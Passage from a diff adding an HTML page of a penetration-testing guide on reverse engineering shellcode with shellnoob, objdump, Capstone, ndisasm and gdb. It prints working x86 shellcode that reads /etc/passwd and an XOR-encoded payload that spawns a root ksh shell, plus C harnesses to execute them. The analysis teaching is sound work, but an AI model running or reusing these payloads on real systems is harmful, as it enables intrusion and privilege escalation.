+<span class="n">hexcolon</span> <span class="o">=</span> <span class="s1">&#39;:&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">hex</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="nb">hex</span><span class="p">),</span> <span class="mi">2</span><span class="p">))</span>
+<span class="c1"># and to reverse this back to bytes</span>
+<span class="n">shellcode_from_hexcolon</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">hexcolon</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">))</span>
+
+<span class="c1"># Add \x to get &quot;\x31\xdb\xb0\x01\xcd\x80&quot;</span>
+<span class="n">hexed</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">x&#39;</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\\</span><span class="s2">x&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">hex</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="nb">hex</span><span class="p">),</span> <span class="mi">2</span><span class="p">))</span>
+<span class="c1"># and to reverse this back to bytes</span>
+<span class="n">shellcode_from_hexed</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">hexed</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">x&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">))</span>
+
+<span class="c1"># Show the results</span>
+<span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">hexcolon</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">hexed</span><span class="p">)</span>
+<span class="n">EOF</span>
+
+<span class="c1"># Show this runs in both python 2 &amp; 3</span>
+<span class="n">python2</span> <span class="n">conversions</span><span class="o">.</span><span class="n">py</span>
+<span class="n">python2</span> <span class="n">conversions</span><span class="o">.</span><span class="n">py</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="reverse-engineering-shellcode">
+<h2>9.4.4. Reverse engineering shellcode<a class="headerlink" href="#reverse-engineering-shellcode" title="Permalink to this headline">¶</a></h2>
+<p>This is not a general introduction to reverse engineering; for a look at general reverse engineering tools consider looking <a class="reference external" href="https://remnux.org/docs/distro/tools/">Tools Installed on REMnux</a> or other distributions dedicated to reverse engineering.</p>
+<p>Here we take a limited look at simply reverse engineering shellcode to determine if the code does what it claims to do. That is especially difficult when the code has some form of encoding (which is the idea behind encoding). There are 2 approaches:</p>
+<ul class="simple">
+<li>Convert shellcode to assembly code then read it.</li>
+<li>Run the shellcode using a debugger setting the appropriate breakpoints to inspect code prior to execution.</li>
+</ul>
+<div class="section" id="linux-reverse-engineering-shellcode">
+<h3>9.4.4.1. Linux reverse engineering shellcode<a class="headerlink" href="#linux-reverse-engineering-shellcode" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="shellnoob-for-shellcode">
+<h4>9.4.4.1.1. <a class="reference external" href="https://github.com/reyammer/shellnoob">shellnoob</a> for shellcode<a class="headerlink" href="#shellnoob-for-shellcode" title="Permalink to this headline">¶</a></h4>
+<p><strong class="program">shellnoob</strong> does not generate shellcode but is useful tool to convert between shellcode formats; interactive asm-to-opcode conversion; resolve syscall numbers, constants, and error numbers; debug using “–to-strace” and “–to-gdb”. Here are some simple examples:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Get raw shellcode in a file.</span>
+<span class="nv">SHELLCODE</span><span class="o">=</span><span class="s2">&quot;\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80&quot;</span>
+<span class="nb">echo</span> -n <span class="s2">&quot;</span><span class="nv">$SHELLCODE</span><span class="s2">&quot;</span> <span class="p">|</span> tr -d <span class="s1">&#39;\\\x&#39;</span> <span class="p">|</span> xxd -r -p &gt; shellcode.bin
+<span class="c1"># Disassemble</span>
+shellnoob --from-bin <span class="nv">$PWD</span>/shellcode.bin --intel --to-asm <span class="nv">$PWD</span>/shellcode.asm
+cat shellcode.asm
+<span class="c1"># &quot;int 80&quot; uses 0xb argument - is that execve?</span>
+shellnoob --get-sysnum execve
+</pre></div>
+</div>
+</div>
+<div class="section" id="objdump-capstone-and-ndisasm-to-disassemble-shellcode">
+<h4>9.4.4.1.2. <strong class="program">objdump</strong>, <a class="reference external" href="http://www.capstone-engine.org/documentation.html">Capstone</a>, and <strong class="program">ndisasm</strong>  to disassemble shellcode<a class="headerlink" href="#objdump-capstone-and-ndisasm-to-disassemble-shellcode" title="Permalink to this headline">¶</a></h4>
+<p>A simple disassembler can be used on simple (non-encoded, non-staged) shellcode, followed by code inspection. We follow the recipe above to get the raw shellcode into a file, then run <strong class="program">objdump</strong>:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Get raw shellcode in a file.</span>
+<span class="nv">SHELLCODE</span><span class="o">=</span><span class="s2">&quot;\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80&quot;</span>
+<span class="nb">echo</span> -n <span class="s2">&quot;</span><span class="nv">$SHELLCODE</span><span class="s2">&quot;</span> &gt; shellcode.hex
+cat shellcode.hex <span class="p">|</span> tr -d <span class="s1">&#39;\\\x&#39;</span> <span class="p">|</span> xxd -r -p &gt; shellcode.raw
+<span class="c1"># Disassemble</span>
+objdump -b binary -m i386 -D shellcode.raw
+</pre></div>
+</div>
+<p>Here is an example following <a class="reference external" href="http://www.capstone-engine.org/lang_python.html">Python tutorial for Capstone</a> to disassemble shellcode:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span>cat &lt;&lt;<span class="s2">&quot;EOF&quot;</span> &gt;disassem.py
+<span class="c1"># disassem</span>
+from capstone import *
+
+<span class="nv">SHELLCODE</span> <span class="o">=</span> b<span class="s2">&quot;\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80&quot;</span>
+
+<span class="nv">md</span> <span class="o">=</span> Cs<span class="o">(</span>CS_ARCH_X86, CS_MODE_64<span class="o">)</span>
+<span class="k">for</span> i in md.disasm<span class="o">(</span>SHELLCODE, 0x1000<span class="o">)</span>:
+    print<span class="o">(</span><span class="s2">&quot;0x%x:\t%s\t%s&quot;</span> %<span class="o">(</span>i.address, i.mnemonic, i.op_str<span class="o">))</span>
+EOF
+
+python disassem.py
+</pre></div>
+</div>
+<p>Proceed as in the case of using <strong class="program">objdump</strong>.</p>
+<p>Here is an example using <a class="reference external" href="http://www.nasm.us/doc/nasmdoc0.html">NASM</a>’s <strong class="program">ndisasm</strong> to disassemble shellcode:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Get raw shellcode in a file.</span>
+<span class="nv">SHELLCODE</span><span class="o">=</span><span class="s2">&quot;\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80&quot;</span>
+<span class="nb">echo</span> -n <span class="s2">&quot;</span><span class="nv">$SHELLCODE</span><span class="s2">&quot;</span> &gt; shellcode.hex
+cat shellcode.hex <span class="p">|</span> tr -d <span class="s1">&#39;\\\x&#39;</span> <span class="p">|</span> xxd -r -p &gt; shellcode.raw
+<span class="c1"># Disassemble</span>
+nasm -b <span class="m">32</span> shellcode.raw
+</pre></div>
+</div>
+<p>Proceed as in the case of using <strong class="program">objdump</strong>.</p>
+</div>
+<div class="section" id="gdb-to-disassemble-shellcode">
+<h4>9.4.4.1.3. <strong class="program">gdb</strong> to disassemble shellcode<a class="headerlink" href="#gdb-to-disassemble-shellcode" title="Permalink to this headline">¶</a></h4>
+<p>Here we reproduce 3 examples of disassembly. <a class="reference external" href="https://dl.packetstormsecurity.net/papers/shellcode/re_shellcode.pdf">Linux x86 Reverse Engineering</a> contains 2 Linux shellcode examples: (1) simple program that runs <code class="docutils literal"><span class="pre">/bin/cat</span> <span class="pre">/etc//passwd</span></code>; (2) XOR-encrypted shellcode that launches a new <strong class="program">ksh</strong> shell running as root. <a class="reference external" href="https://nasmland645.wordpress.com/2015/02/08/assignment-5-1-msf-shellcode-analysis-linuxx86shellreverse_tcp/">Assignment 5.1: MSF shellcode analysis linux/x86/shell/reverse_tcp</a> walks us through disassembling the standard metasploit linux/x86/shell/reverse_tcp staged payload.</p>
+<div class="section" id="linux-x86-reverse-engineering-example-1">
+<h5>9.4.4.1.3.1. <a class="reference external" href="https://dl.packetstormsecurity.net/papers/shellcode/re_shellcode.pdf">Linux x86 Reverse Engineering</a> Example 1<a class="headerlink" href="#linux-x86-reverse-engineering-example-1" title="Permalink to this headline">¶</a></h5>
+<p>First create a C program containing the shellcode purportedly running <code class="docutils literal"><span class="pre">/bin/cat</span> <span class="pre">/etc//passwd</span></code>.</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># NOTE - this compiles as a 32-bit executable.</span>
+<span class="c1"># Example 1 C code.</span>
+cat &lt;&lt;<span class="s2">&quot;EOF&quot;</span> &gt; code.c
+<span class="c1">#include &lt;stdio.h&gt;</span>
+<span class="c1">#include &lt;string.h&gt;</span>
+unsigned char code<span class="o">[]</span> <span class="o">=</span> <span class="se">\</span>
+<span class="s2">&quot;\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80&quot;</span><span class="p">;</span>
+
+main<span class="o">()</span>
+<span class="o">{</span>
+    printf<span class="o">(</span><span class="s2">&quot;Shellcode Length: %d\n&quot;</span>, strlen<span class="o">(</span>code<span class="o">))</span><span class="p">;</span>
+    int <span class="o">(</span>*ret<span class="o">)()</span> <span class="o">=</span> <span class="o">(</span>int<span class="o">(</span>*<span class="o">)())</span>code<span class="p">;</span>
+    ret<span class="o">()</span><span class="p">;</span>
+<span class="o">}</span>
+EOF
+
+<span class="c1"># Compile, link as 32-bit.</span>
+gcc -m32 -fno-stack-protector -z execstack code.c -o shellcode
+chmod +x shellcode
+</pre></div>
+</div>
+<p>Now you could exclusively use <strong class="program">objdump</strong> to disassemble the shellcode. The code is in the .data section of the shellcode ELF file, so <code class="docutils literal"><span class="pre">objdump</span> <span class="pre">-D</span> <span class="pre">-j</span> <span class="pre">.data</span> <span class="pre">shellcode</span></code> will disassemble:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span>hacker@kali:~$ objdump -M intel -D -j .data shellcode
+
+shellcode:     file format elf32-i386
+
+
+Disassembly of section .data:
+
+<span class="m">08049740</span> &lt;__data_start&gt;:
+ <span class="m">8049740</span>:     <span class="m">00</span> <span class="m">00</span>                   add    BYTE PTR <span class="o">[</span>eax<span class="o">]</span>,al
+        ...
+
+<span class="m">08049744</span> &lt;__dso_handle&gt;:
+        ...
+
+<span class="m">08049760</span> &lt;code&gt;:
+ <span class="m">8049760</span>:     <span class="m">31</span> c0                   xor    eax,eax
+ <span class="m">8049762</span>:     <span class="m">99</span>                      cdq
+ <span class="m">8049763</span>:     <span class="m">52</span>                      push   edx
+ <span class="m">8049764</span>:     <span class="m">68</span> 2f <span class="m">63</span> <span class="m">61</span> <span class="m">74</span>          push   0x7461632f
+ <span class="m">8049769</span>:     <span class="m">68</span> 2f <span class="m">62</span> <span class="m">69</span> 6e          push   0x6e69622f
+ 804976e:     <span class="m">89</span> e3                   mov    ebx,esp
+ <span class="m">8049770</span>:     <span class="m">52</span>                      push   edx
+ <span class="m">8049771</span>:     <span class="m">68</span> <span class="m">73</span> <span class="m">73</span> <span class="m">77</span> <span class="m">64</span>          push   0x64777373
+ <span class="m">8049776</span>:     <span class="m">68</span> 2f 2f <span class="m">70</span> <span class="m">61</span>          push   0x61702f2f
+ 804977b:     <span class="m">68</span> 2f <span class="m">65</span> <span class="m">74</span> <span class="m">63</span>          push   0x6374652f
+ <span class="m">8049780</span>:     <span class="m">89</span> e1                   mov    ecx,esp
+ <span class="m">8049782</span>:     b0 0b                   mov    al,0xb
+ <span class="m">8049784</span>:     <span class="m">52</span>                      push   edx
+ <span class="m">8049785</span>:     <span class="m">51</span>                      push   ecx
+ <span class="m">8049786</span>:     <span class="m">53</span>                      push   ebx
+ <span class="m">8049787</span>:     <span class="m">89</span> e1                   mov    ecx,esp
+ <span class="m">8049789</span>:     <span class="nb">cd</span> <span class="m">80</span>                   int    0x80
+        ...
+</pre></div>
+</div>
+<p>Physically inspecting the assembler could lead to knowning what the code does. But that can get difficult in general. Instead, use <strong class="program">gdb</strong> to run the code and disassemble. After starting <code class="docutils literal"><span class="pre">gdb</span> <span class="pre">shellcode</span></code>, set a breakpoint where the shellcode resides (“break *&amp;code”), then “run”. When the breakpoint is reached, “disassemble” shows the instruction <code class="docutils literal"><span class="pre">int</span> <span class="pre">0x80</span></code>. Set another breakpoint there (“break 0x08049789”, but this may be different for you), then “continue” execution to reach that breakpoint. At this point the registers and memory can be examined to determine that the system call is <code class="docutils literal"><span class="pre">execve</span></code> for <code class="docutils literal"><span class="pre">/bin/cat</span> <span class="pre">/etc//passwd</span></code>.</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># NOTE - your breakpoint values for gdb will likely differ.</span>
+<span class="c1"># Create file of gdb inputs for batch run.</span>
+cat &gt; gdb.in &lt;&lt;<span class="s2">&quot;EOF&quot;</span>
+<span class="nb">set</span> disassembly-flavor intel
+<span class="c1"># Set breakpoint at &lt;code&gt;, then run.</span>
+<span class="nb">break</span> *<span class="p">&amp;</span>code
+run
+<span class="c1"># Disassemble and read, determining the next breakpoint is the int instruction.</span>
+disassemble
+<span class="c1"># Adjust the breakpoint to the address of the int instruction, then continue.</span>
+<span class="nb">break</span> *0x08049789
+<span class="k">continue</span>
+<span class="c1"># See that the int argument is 11 = &quot;execve&quot;</span>
+print <span class="nv">$eax</span>
+print /x <span class="nv">$ebx</span>
+<span class="c1"># See execve arguments are &quot;/bin/cat /etc//passwd&quot;.</span>
+x/s <span class="nv">$ebx</span>
+x/16 <span class="nv">$ecx</span>
+quit
+EOF
+
+<span class="c1"># Batch gdb execution.</span>
+<span class="c1"># However, your first gdb run should be manual, cut-and-paste of the gdb.in file.</span>
+<span class="c1"># This is because your breakpoint address will likely be different.</span>
+gdb --batch --command<span class="o">=</span>gdb.in ./shellcode
+
+<span class="c1"># Run the actual shellcode to verify it prints out /etc/passwd.</span>
+./shellcode
+</pre></div>
+</div>
+<p>Note how <strong class="program">gdb</strong> can replace laborious manual code simulation.</p>
+</div>
+<div class="section" id="linux-x86-reverse-engineering-example-2">
+<h5>9.4.4.1.3.2. <a class="reference external" href="https://dl.packetstormsecurity.net/papers/shellcode/re_shellcode.pdf">Linux x86 Reverse Engineering</a> Example 2<a class="headerlink" href="#linux-x86-reverse-engineering-example-2" title="Permalink to this headline">¶</a></h5>
+<p>This example is more complex in that the code is xor-encoded, so manually reading <strong class="program">objdump</strong> listing is difficult at best. As above, create a C program containing shellcode, but skip the <strong class="program">objdump</strong> listing and proceed directly to <strong class="program">gdb</strong>.</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># NOTE - this compiles as a 32-bit executable.</span>
+<span class="c1"># Example 2 C code.</span>
+cat &lt;&lt;<span class="s2">&quot;EOF&quot;</span> &gt; code.c
+<span class="c1">#include &lt;stdio.h&gt;</span>
+<span class="c1">#include &lt;string.h&gt;</span>
+unsigned char code<span class="o">[]</span> <span class="o">=</span> <span class="se">\</span>
+<span class="s2">&quot;\xeb\x0d\x5e\x31\xc9\xb1\x21\x80\x36\x7c\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x16\x3a\x24\x4d\xa7\x4d\xb5\xb1\xfc\x4d\xae\x16\x77\x24\x2e\x14\x53\x17\x0f\x14\x14\x53\x1e\x15\x12\xf5\x9f\x2e\x2f\xf5\x9d\xb1\xfc&quot;</span><span class="p">;</span>
+
+main<span class="o">()</span>
+<span class="o">{</span>
+    printf<span class="o">(</span><span class="s2">&quot;Shellcode Length: %d\n&quot;</span>, strlen<span class="o">(</span>code<span class="o">))</span><span class="p">;</span>
+    int <span class="o">(</span>*ret<span class="o">)()</span> <span class="o">=</span> <span class="o">(</span>int<span class="o">(</span>*<span class="o">)())</span>code<span class="p">;</span>
+    ret<span class="o">()</span><span class="p">;</span>
+<span class="o">}</span>
+EOF
+
+<span class="c1"># Compile, link as 32-bit.</span>
+gcc -m32 -fno-stack-protector -z execstack code.c -o shellcode
+chmod +x shellcode
+</pre></div>
+</div>
+<p>Now start <strong class="program">gdb</strong> to start analyzing the shellcode. You’ll quickly see that the code xor-decodes itself, meaning you’ll have to set breakpoints before &amp; after the decoding to see the decoded shellcode. Then additional breakpoints can be added to inspect the 2 <code class="docutils literal"><span class="pre">int</span> <span class="pre">0x80</span></code> instructions.</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Create file of gdb inputs for batch run.</span>
+cat &gt; gdb.in &lt;&lt;<span class="s2">&quot;EOF&quot;</span>
+<span class="nb">set</span> disassembly-flavor intel
+<span class="c1"># Set breakpoint at &lt;code&gt;, then run.</span>
+<span class="nb">break</span> *<span class="p">&amp;</span>code
+run
+<span class="c1"># Disassemble and read, determining the next breakpoint is the jump instruction.</span>
+disassemble
+<span class="nb">break</span> *0x0804976d
+<span class="k">continue</span>
+<span class="c1"># Disassemble and read, determining the next breakpoint is the next int instruction.</span>
+disassemble
+<span class="nb">break</span> *0x0804977b
+<span class="k">continue</span>
+<span class="c1"># See that the int argument is 0x46 = &quot;setreuid&quot; with arguments 0,0 (root)</span>
+print <span class="nv">$eax</span>
+print <span class="nv">$ebx</span>
+print <span class="nv">$ecx</span>
+<span class="c1"># Disassemble and read, determining the next breakpoint is the next int instruction.</span>
+disassemble
+<span class="nb">break</span> *0x08049793
+<span class="k">continue</span>
+<span class="c1"># See that the int argument is 11 = &quot;execve&quot; running &quot;/bin/ksh&quot;.</span>
+print <span class="nv">$eax</span>
+print <span class="nv">$ebx</span>
+x/s <span class="nv">$ebx</span>
+print <span class="nv">$ecx</span>
+x/s <span class="nv">$ecx</span>
+quit
+EOF
+
+<span class="c1"># Batch gdb execution.</span>
+<span class="c1"># However, your first gdb run should be manual, cut-and-paste of the gdb.in file.</span>
+<span class="c1"># This is because your breakpoint address will likely be different.</span>
+gdb --batch --command<span class="o">=</span>gdb.in ./shellcode
+
+<span class="c1"># Don&#39;t run the actual shellcode as it will spawn a root shell.</span>
+<span class="c1"># ./shellcode</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="assignment-5-1-msf-shellcode-analysis-linux-x86-shell-reverse-tcp-example-3">
+<h5>9.4.4.1.3.3. <a class="reference external" href="https://nasmland645.wordpress.com/2015/02/08/assignment-5-1-msf-shellcode-analysis-linuxx86shellreverse_tcp/">Assignment 5.1: MSF shellcode analysis linux/x86/shell/reverse_tcp</a> Example 3<a class="headerlink" href="#assignment-5-1-msf-shellcode-analysis-linux-x86-shell-reverse-tcp-example-3" title="Permalink to this headline">¶</a></h5>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+
+           </div>
+           <div class="articleComments">
+            
+           </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="../pentest_scripting.html" class="btn btn-neutral float-right" title="10. Pentest scripting" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="rop.html" class="btn btn-neutral" title="9.3. Return-oriented programming" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2017, bitbender.
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  
+
+    <script type="text/javascript">
+        var DOCUMENTATION_OPTIONS = {
+            URL_ROOT:'../',
+            VERSION:'1.0.2',
+            COLLAPSE_INDEX:false,
+            FILE_SUFFIX:'.html',
+            HAS_SOURCE:  true,
+            SOURCELINK_SUFFIX: '.txt'
+        };
+    </script>
+      <script type="text/javascript" src="../_static/jquery.js"></script>
+      <script type="text/javascript" src="../_static/underscore.js"></script>
+      <script type="text/javascript" src="../_static/doctools.js"></script>
+      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+  
+
+  
+  
+    <script type="text/javascript" src="../_static/js/theme.js"></script>
+  
+
+  
+  
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.StickyNav.enable();
+      });
+  </script>
+   
+
+</body>
+</html>
